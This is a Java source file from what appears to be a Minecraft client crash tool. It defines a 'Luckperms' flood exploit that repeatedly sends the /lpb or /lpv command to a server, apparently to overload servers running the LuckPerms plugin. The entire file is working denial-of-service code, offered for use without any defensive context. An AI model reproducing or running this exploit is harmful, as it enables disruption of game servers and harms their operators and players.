package dev.isnow.puppy.exploit.impl.flood;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.exploit.argument.Argument;
import dev.isnow.puppy.helper.ChatHelper;

@ExploitInfo(
        name = "Luckperms",
        type = ExploitType.FLOOD,
        usage = ".crash luckperms packets LPB/LPV",
        description = "/LPV and /LPB luckperms exploit"
)
public class LuckpermsExploit extends Exploit {

    public LuckpermsExploit() {
        super(new Argument("lpb", 0, Boolean.class), new Argument("packets", 1, Integer.class));
    }
    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        int packets = (int) args[1];
        boolean lpb = (boolean) args[0];
        ChatHelper.printMessage(
                String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
        for (int i = 0; i < packets; i++) {
            if(lpb) {
                mc.thePlayer.sendChatMessage("/lpb");
            } else {
                mc.thePlayer.sendChatMessage("/lpv");
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
